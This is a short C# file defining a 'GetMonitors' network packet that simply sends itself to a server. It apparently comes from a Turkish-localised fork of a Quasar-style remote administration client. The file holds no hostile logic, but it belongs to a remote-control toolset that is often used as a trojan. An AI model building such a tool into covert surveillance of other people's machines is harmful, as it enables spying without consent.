using System;
using xClient.KuuhakuÇekirdek.Ağ;

namespace xClient.KuuhakuÇekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class GetMonitors : IPacket
    {
        public GetMonitors()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}